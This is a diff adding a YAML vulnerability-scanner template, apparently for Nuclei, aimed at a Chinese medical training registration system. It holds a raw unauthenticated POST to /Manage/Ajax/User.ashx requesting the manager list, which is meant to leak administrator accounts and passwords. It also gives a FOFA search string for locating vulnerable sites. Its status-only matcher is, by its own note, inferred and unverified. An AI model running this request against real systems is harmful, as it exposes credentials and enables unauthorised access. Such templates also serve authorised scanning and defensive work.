@@ -1,0 +1,28 @@
+id: poc-2247f36c014d8c44a9ea
+info:
+  name: 远秋医学培训报名系统User存在未授权账号密码泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/2247f36c014d8c44a9eac8b23ec97847
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: info-leak,unauth,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 2247f36c014d8c44a9eac8b23ec97847
+    fofa: title="医学在线考试系统"
+http:
+- raw:
+  - 'POST /Manage/Ajax/User.ashx/ HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+
+    oper=getManagerList&name=&code=&depart=&page=1&rows=15'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
